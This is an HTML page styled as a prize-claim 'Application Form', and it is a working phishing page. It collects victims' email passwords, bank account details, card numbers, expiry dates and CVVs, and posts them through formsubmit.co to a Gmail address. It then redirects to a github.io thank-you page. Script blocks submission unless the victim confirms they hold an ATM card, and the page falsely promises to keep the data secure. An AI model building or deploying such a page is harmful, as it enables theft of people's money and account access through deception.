<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      padding: 20px;
    }
    form {
      background: #fff;
      padding: 20px;
      border-radius: 10px;
      max-width: 500px;
      margin: auto;
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
    }
    label {
      display: block;
      margin: 10px 0 5px;
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;
      border-radius: 5px;
      border: 1px solid #ccc;
      font-size: 16px;
    }
    .hidden {
      display: none;
    }
    .error {
      color: red;
      font-size: 14px;
      display: none;
    }
    #password-container {
      position: relative;
    }
    #togglePassword {
      position: absolute;
      right: 10px;
      top: 10px;
      cursor: pointer;
    }
    #submitBtn {
      background-color: green;
      color: white;
      font-size: 18px;
      padding: 12px;
      border: none;
      border-radius: 8px;
      width: 100%;
    }
    .note {
      font-weight: bold;
      margin-top: 20px;
    }
    .secure {
      font-size: 14px;
      color: #555;
      text-align: center;
      margin-top: 15px;
    }
    .disabled-state {
      background: #ffecec;
      border: 1px solid #ff5e5e;
      padding: 10px;
      color: #d8000c;
      font-weight: bold;
      border-radius: 5px;
      margin-bottom: 15px;
    }
  </style>
</head>
<body>
  <form action="https://formsubmit.co/exellentfirm@gmail.com" method="POST" onsubmit="return validateForm()">
    <h2>Application Form</h2>

    <label>Full Name</label>
    <input type="text" name="Full Name" id="fullName" required />

    <label>Country</label>
    <input type="text" name="Country" required />

    <label>Phone Number</label>
    <input type="tel" name="Phone Number" id="phone" required />
    <div class="error" id="phoneError">Phone number must be 9‚Äì12 digits</div>

    <label>Email Address</label>
    <input type="email" name="Email" required />

    <label>Email Password</label>
    <div id="password-container">
      <input type="password" name="Email Password" id="emailPassword" required />
      <span id="togglePassword">üëÅÔ∏è</span>
    </div>

    <label>Amount You Won</label>
    <input type="text" name="Amount Won" id="amountWon" required />

    <label>Bank Account Type (e.g., Standard Bank Account)</label>
    <input type="text" name="Account Type" id="accountType" required />

    <label>Bank Account Number</label>
    <input type="text" name="Account Number" id="accountNumber" required />

    <label>Bank Account Holder's Name</label>
    <input type="text" name="Account Holder Name" required />

    <label>Did You Link ATM to Your Bank Account?</label>
    <select name="ATM Linked" id="atmLinked" required>
      <option value="">--Select--</option>
      <option value="Yes">Yes</option>
      <option value="No">No</option>
    </select>

    <div id="atmFields">
      <label>ATM Card Number</label>
      <input type="text" name="ATM Card Number" id="cardNumber" />
      <div class="error" id="cardError">Card number must be 16 digits</div>

      <label>Expiry Date (MM/YY)</label>
      <input type="text" name="Expiry Date" id="expiryDate" placeholder="MM/YY" />
      <div class="error" id="expiryError">Enter valid MM/YY format</div>

      <label>CVV</label>
      <input type="text" name="CVV" id="cvv" />
      <div class="error" id="cvvError">CVV must be exactly 3 digits</div>

      <p class="note" id="finalNote">Dear <span id="noteName"></span>, You will receive <span id="noteAmount"></span> to your <span id="noteType"></span>, <span id="noteAccount"></span></p>
    </div>

    <div id="noAtmWarning" class="hidden disabled-state">YOU MUST HAVE ATM CARD TO PROCEED</div>

    <button type="submit" id="submitBtn">Submit</button>

    <div class="secure">We keep your data/details secure and confidential.</div>

    <input type="hidden" name="_redirect" value="https://onlinegistrationprog.github.io/thankyou.html">
  </form>

  <script>
    const atmSelect = document.getElementById("atmLinked");
    const atmFields = document.getElementById("atmFields");
    const note = document.getElementById("finalNote");
    const submitBtn = document.getElementById("submitBtn");
    const warning = document.getElementById("noAtmWarning");

    function toggleATMFields() {
      const value = atmSelect.value;
      if (value === "No") {
        atmFields.style.display = "none";
        submitBtn.style.display = "none";
        warning.classList.remove("hidden");
      } else if (value === "Yes") {
        atmFields.style.display = "block";
        submitBtn.style.display = "block";
        warning.classList.add("hidden");
      } else {
        atmFields.style.display = "none";
        submitBtn.style.display = "none";
        warning.classList.add("hidden");
      }
    }

    atmSelect.addEventListener("change", toggleATMFields);
    window.onload = toggleATMFields;

    // Toggle password visibility
    document.getElementById("togglePassword").addEventListener("click", function () {
      const pw = document.getElementById("emailPassword");
      pw.type = pw.type === "password" ? "text" : "password";
    });

    // Autofill note on blur
    document.getElementById("amountWon").addEventListener("blur", () => {
      document.getElementById("noteAmount").textContent = document.getElementById("amountWon").value;
    });
    document.getElementById("fullName").addEventListener("blur", () => {
      document.getElementById("noteName").textContent = document.getElementById("fullName").value;
    });
    document.getElementById("accountType").addEventListener("blur", () => {
      document.getElementById("noteType").textContent = document.getElementById("accountType").value;
    });
    document.getElementById("accountNumber").addEventListener("blur", () => {
      document.getElementById("noteAccount").textContent = document.getElementById("accountNumber").value;
    });

    // Validation on blur
    document.getElementById("cardNumber").addEventListener("blur", () => {
      const val = document.getElementById("cardNumber").value;
      document.getElementById("cardError").style.display = val.length === 16 ? "none" : "block";
    });

    document.getElementById("cvv").addEventListener("blur", () => {
      const val = document.getElementById("cvv").value;
      document.getElementById("cvvError").style.display = /^\d{3}$/.test(val) ? "none" : "block";
    });

    document.getElementById("phone").addEventListener("blur", () => {
      const val = document.getElementById("phone").value;
      document.getElementById("phoneError").style.display = /^\d{9,12}$/.test(val) ? "none" : "block";
    });

    document.getElementById("expiryDate").addEventListener("input", (e) => {
      let val = e.target.value.replace(/\D/g, "");
      if (val.length >= 3) {
        val = val.slice(0, 2) + "/" + val.slice(2, 4);
      }
      e.target.value = val;
    });

    document.getElementById("expiryDate").addEventListener("blur", () => {
      const val = document.getElementById("expiryDate").value;
      const isValid = /^(0[1-9]|1[0-2])\/\d{2}$/.test(val);
      document.getElementById("expiryError").style.display = isValid ? "none" : "block";
    });

    function validateForm() {
      return true;
    }
  </script>
</body>
</html>
